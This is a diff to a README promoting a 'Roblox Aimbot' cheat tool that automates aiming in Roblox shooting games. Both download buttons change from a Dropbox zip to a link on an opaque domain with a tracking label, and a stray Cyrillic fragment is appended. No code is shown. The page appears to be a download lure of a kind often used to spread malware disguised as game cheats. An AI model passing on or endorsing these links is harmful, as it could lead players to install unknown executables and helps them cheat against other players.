@@ -2,7 +2,7 @@
 
 **Roblox Aimbot** is a tool designed to enhance your gaming experience in Roblox by automatically aiming and shooting at enemies or targets with precise accuracy. This tool is commonly used in various Roblox shooting games to gain an advantage by automating the aiming process, ensuring perfect shots every time. Whether you’re playing competitive games or just experimenting with different playstyles, Roblox Aimbot provides an edge for players looking to improve their in-game performance.
 
-[![Download Roblox AimBot](https://img.shields.io/badge/Download-Roblox%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download Roblox AimBot](https://img.shields.io/badge/Download-Roblox%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## 🚀 Features
 
@@ -26,4 +26,5 @@ To use the Roblox Aimbot, follow these steps:
 6. **Activate** the aimbot and begin playing.
 
 
-[![Download Roblox AimBot](https://img.shields.io/badge/Download-Roblox%20AimBot-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download Roblox AimBot](https://img.shields.io/badge/Download-Roblox%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+фс
